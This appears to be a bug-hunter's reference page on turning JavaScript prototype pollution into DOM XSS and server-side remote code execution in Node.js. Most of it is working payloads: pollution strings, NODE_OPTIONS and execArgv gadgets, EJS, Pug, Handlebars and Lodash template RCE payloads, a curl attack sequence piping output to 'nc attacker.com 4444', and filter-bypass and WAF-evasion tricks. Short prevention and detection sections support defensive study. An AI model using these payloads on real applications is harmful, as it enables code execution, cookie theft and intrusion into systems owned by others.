---
tags:
  - critical
---

# Prototype Pollution → XSS/RCE

From polluting JavaScript prototypes to code execution.

## TL;DR

Prototype Pollution (PP) lets attackers inject properties into JavaScript's `Object.prototype`, which are then inherited by all objects. Combined with the right **gadget**, this leads to:
- **Client-side PP → DOM XSS** via polluted config/options objects
- **Server-side PP → RCE** via child_process env vars, template engines, or require path manipulation

**Key insight:** You need two things:
1. **Source** — A way to pollute the prototype (`__proto__`, `constructor.prototype`)
2. **Gadget** — A property that reaches a dangerous sink when inherited

---

## Overview

```
┌──────────────────────────────────────────────────────────────┐
│                    PROTOTYPE POLLUTION                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  SOURCES (User Input)              SINKS (Code Execution)   │
│  ─────────────────────             ────────────────────────  │
│  • Query string (?__proto__[x]=y)  • innerHTML / eval()     │
│  • JSON body (__proto__: {})       • child_process.*()      │
│  • URL fragment                    • Template engines       │
│  • Web messages                    • require() paths        │
│  • Recursive object merge          • NODE_OPTIONS env       │
│                                                              │
│  CLIENT-SIDE                       SERVER-SIDE              │
│  ───────────                       ───────────              │
│  PP → DOM Gadget → XSS             PP → Node Gadget → RCE   │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## Chain 1: Client-Side PP → XSS

### Via URL Query String

```javascript
// Vulnerable code: recursive merge without sanitization
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker-controlled URL:
// https://target.com/?__proto__[evilProp]=payload
```

### Detection Payloads

```
# Bracket notation
?__proto__[testProp]=polluted

# Dot notation
?__proto__.testProp=polluted

# Via constructor
?constructor[prototype][testProp]=polluted
?constructor.prototype.testProp=polluted

# Verify in console
Object.prototype.testProp  // Should return "polluted"
```

### Common DOM Gadgets

**1. innerHTML via config object:**
```javascript
// Vulnerable code
let config = {};
if(config.transport_url) {
    element.innerHTML = config.transport_url;
}

// Exploit
?__proto__[transport_url]=<img src=x onerror=alert(1)>
```

**2. jQuery $.extend() gadget:**
```javascript
// jQuery < 3.4.0 vulnerable to PP
$.extend(true, {}, JSON.parse(userInput));

// Payload
{"__proto__": {"evilProperty": "<img src=x onerror=alert(1)>"}}
```

**3. script.src gadget:**
```javascript
// Vulnerable code
let script = document.createElement('script');
script.src = `${config.cdn_url}/app.js`;

// Exploit
?__proto__[cdn_url]=//evil.com
```

**4. fetch() headers gadget:**
```javascript
// Vulnerable code
fetch('/api/data', {method: 'GET'})
    .then(r => r.json())
    .then(data => {
        element.innerHTML = data['x-username'];
    });

// Pollute headers to inject response
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

**5. Object.defineProperty bypass:**
```javascript
// "Protection" that's actually vulnerable
Object.defineProperty(obj, 'prop', {
    configurable: false,
    writable: false
    // No value set - inherits from prototype!
});

// Exploit
?__proto__[value]=maliciousValue
```

---

## Chain 2: Server-Side PP → RCE

Server-side PP is harder to detect (no console) but leads to RCE.

### Via child_process Environment Variables

When Node spawns a child process, it inherits environment variables from `options.env`. Polluting `__proto__` adds env vars to **all** spawned processes.

**Fork/Spawn RCE via NODE_OPTIONS:**
```javascript
// Vulnerable merge
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// If application later calls fork(), spawn(), exec(), etc.
const { fork } = require('child_process');
fork('worker.js');  // Triggers the gadget
```

**Payload (via /proc/self/environ):**
```json
{
  "__proto__": {
    "env": {
      "EVIL": "console.log(require('child_process').execSync('id').toString())//"
    },
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}
```

**Payload (via /proc/self/cmdline):**
```json
{
  "__proto__": {
    "argv0": "console.log(require('child_process').execSync('whoami').toString())//",
    "NODE_OPTIONS": "--require /proc/self/cmdline"
  }
}
```

**Node ≥19: Filesystem-less via --import (data: URL):**
```javascript
// Most reliable - no filesystem needed
const js = "require('child_process').execSync('id | nc attacker.com 4444')";
const payload = `data:text/javascript;base64,${Buffer.from(js).toString('base64')}`;

// Pollution payload
{
  "__proto__": {
    "NODE_OPTIONS": `--import ${payload}`
  }
}
```

### Via fork() execArgv Property

`fork()` accepts `execArgv` - command line args for the child Node process:

```json
{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('touch /tmp/pwned')"
    ]
  }
}
```

### Via execSync() shell + input

```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":!id > /tmp/pwned\n"
  }
}
```

### DNS Detection (Safe)

Use `--inspect` for out-of-band detection without breaking the app:

```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=YOUR-BURP-COLLAB-ID.oastify.com"
  }
}
```

Obfuscated (bypass WAF):
```json
{
  "__proto__": {
    "NODE_OPTIONS": "--inspect=id\"\".oastify\"\".com"
  }
}
```

---

## Chain 3: Template Engine Gadgets

### EJS (Embedded JavaScript)

**CVE-2022-29078** - RCE via `escapeFunction` pollution:

```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc attacker.com 4444')"
  }
}
```

**Why it works:**
```javascript
// EJS compile() function
if (opts.client) {
    src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
}
// escapeFunction.toString() gets evaluated!
```

**Full attack:**
```bash
# 1. Pollute prototype
curl -X POST http://target/vuln -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": 1, "escapeFunction": "JSON.stringify;process.mainModule.require(\"child_process\").exec(\"id | nc attacker.com 4444\")"}}'

# 2. Visit any page that renders EJS template
curl http://target/

# 3. Catch RCE
nc -lvp 4444
```

### Pug (formerly Jade)

**AST Injection via `block` pollution:**

```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }
  }
}
```

### Handlebars

**RCE via `allowProtoMethodsByDefault`:**

```json
{
  "__proto__": {
    "allowProtoMethodsByDefault": true,
    "allowProtoPropertiesByDefault": true
  }
}
```

Then exploit with:
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Chain 4: Lodash Gadgets

### Lodash merge() (< 4.17.12)

```javascript
const _ = require('lodash');

// Vulnerable
_.merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// Now ALL objects have isAdmin = true
let user = {};
console.log(user.isAdmin);  // true
```

### Lodash template() RCE

```json
{
  "__proto__": {
    "sourceURL": "\nprocess.mainModule.require('child_process').execSync('id')//"
  }
}
```

**Why it works:**
```javascript
// Lodash template adds sourceURL for debugging
// //# sourceURL=${sourceURL}
// Our payload breaks out and executes code
```

---

## Chain 5: Require Path Hijacking

### Absolute require() hijack via `main`

If a package doesn't have `main` in package.json:

```json
{
  "__proto__": {
    "main": "/tmp/malicious.js"
  }
}
```

```javascript
// /tmp/malicious.js
const { fork } = require('child_process');
console.log('Pwned!');
fork('anything');  // Triggers RCE gadget
```

### Relative require() hijack

```json
{
  "__proto__": {
    "exports": { ".": "./malicious.js" },
    "1": "/tmp"
  }
}
```

```json
{
  "__proto__": {
    "data": {
      "exports": { ".": "./malicious.js" }
    },
    "path": "/tmp",
    "name": "./relative_path.js"
  }
}
```

---

## Detection Techniques

### Safe Black-Box Detection (No DoS)

**1. JSON Spaces Override (Express < 4.17.4):**
```json
{
  "__proto__": {
    "json spaces": 10
  }
}
```
Check if JSON response now has 10 spaces indentation.

**2. Status Code Override:**
```json
{
  "__proto__": {
    "status": 510
  }
}
```
Trigger an error - if status changes to 510, PP successful.

**3. Exposed Headers (CORS module):**
```json
{
  "__proto__": {
    "exposedHeaders": ["X-PP-Test"]
  }
}
```
Check for `Access-Control-Expose-Headers: X-PP-Test`

**4. OPTIONS Method HEAD Removal:**
```json
{
  "__proto__": {
    "head": true
  }
}
```
Send OPTIONS request - if HEAD is missing from Allow, PP works.

**5. UTF-7 Charset Override:**
```json
{
  "__proto__": {
    "content-type": "application/json; charset=utf-7"
  }
}
```
Check if `+AGYAbwBv-` decodes to `foo` in response.

### Automated Tools

- **DOM Invader** (Burp Suite) - Client-side PP detection
- **Server-Side Prototype Pollution Scanner** (BApp Store)
- **ppfuzz** - Prototype pollution fuzzer
- **ppmap** - Prototype pollution scanner

---

## Real-World CVEs

| CVE | Target | Impact | Gadget |
|-----|--------|--------|--------|
| CVE-2019-7609 | Kibana | RCE | NODE_OPTIONS + child_process |
| CVE-2021-25945 | BlitzJS | RCE | argv0 + cmdline |
| CVE-2022-29078 | EJS | RCE | escapeFunction |
| CVE-2019-11358 | jQuery < 3.4.0 | XSS | $.extend() deep merge |
| CVE-2019-10744 | Lodash < 4.17.12 | RCE | _.merge() / _.defaultsDeep() |
| CVE-2020-8203 | Lodash < 4.17.19 | RCE | zipObjectDeep |
| CVE-2021-23337 | Lodash | RCE | template() sourceURL |
| CVE-2022-24999 | qs < 6.10.3 | PP | Query string parsing |
| CVE-2023-45857 | Axios | PP | Config merging |

---

## Full Attack Scenarios

### Scenario 1: Client-Side PP → Stored XSS

```
1. Find merge/extend vulnerability in user profile update
2. Inject PP payload into profile data:
   {"name": "test", "__proto__": {"avatar_url": "<img src=x onerror=alert(document.cookie)>"}}
3. Application stores polluted object
4. Victim views profile → XSS via inherited avatar_url
```

### Scenario 2: Server-Side PP → RCE (Node.js)

```
1. Find JSON endpoint with recursive merge
2. Send PP payload to pollute NODE_OPTIONS:
   POST /api/settings
   {"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"EVIL": "..."}}}
3. Trigger any child_process call (cron job, image processing, etc.)
4. RCE achieved
```

### Scenario 3: PP + Template Engine → RCE

```
1. Find PP source in Express app using EJS
2. Pollute escapeFunction:
   POST /api/user
   {"__proto__": {"client": 1, "escapeFunction": "...RCE payload..."}}
3. Visit any page that renders EJS
4. Template compilation triggers RCE
```

---

## Prevention

### For Developers

**1. Use Object.create(null) for config objects:**
```javascript
// Safe - no prototype chain
const config = Object.create(null);
```

**2. Freeze prototypes:**
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

**3. Use Map instead of objects:**
```javascript
const userInput = new Map();
userInput.set('key', 'value');
```

**4. Sanitize keys before merge:**
```javascript
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Skip dangerous keys
        }
        // ... merge logic
    }
}
```

**5. Use schema validation:**
```javascript
const Joi = require('joi');
const schema = Joi.object({
    name: Joi.string().required(),
    email: Joi.string().email()
});
// Rejects __proto__ by default
```

**6. Node.js flag (disables __proto__):**
```bash
node --disable-proto=throw app.js
# or
node --disable-proto=delete app.js
```

### For Bug Hunters

**Bypass techniques when `__proto__` is filtered:**

```
# Via constructor
constructor[prototype][polluted]=value
constructor.prototype.polluted=value

# Nested __proto__
__pro__proto__to__[polluted]=value

# Unicode variations
\u005f\u005fproto\u005f\u005f[polluted]=value

# JSON with different key order
{"constructor": {"prototype": {"polluted": "value"}}}
```

---

## PoC Template

```markdown
## Summary
Prototype pollution in [endpoint] leads to [XSS/RCE] via [gadget].

## Chain
1. PP source: [URL param / JSON body / etc.]
2. Gadget: [config object / template engine / child_process]
3. Impact: [DOM XSS / Server RCE]

## Reproduction
1. Send payload:
   ```
   [exact request]
   ```
2. Trigger gadget:
   ```
   [trigger action]
   ```
3. Verify impact:
   ```
   [verification]
   ```

## Impact
[Critical - RCE / High - XSS leading to session hijack / etc.]

CVSS: 9.8 (Critical) for RCE
CVSS: 6.1 (Medium) for reflected XSS
```

---

## References

- [PortSwigger - Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger - Web Security Academy](https://portswigger.net/web-security/prototype-pollution)
- [Snyk - jQuery Prototype Pollution](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)
- [HackTricks - PP to RCE](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)
- [mizu.re - EJS SSPP Gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
- [Kibana CVE-2019-7609 Analysis](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [BlitzJS PP Vulnerability](https://blog.sonarsource.com/blitzjs-prototype-pollution/)

---
*Related: [XSS to ATO](xss-to-ato.md) | [SSRF to RCE](ssrf-to-rce.md)*
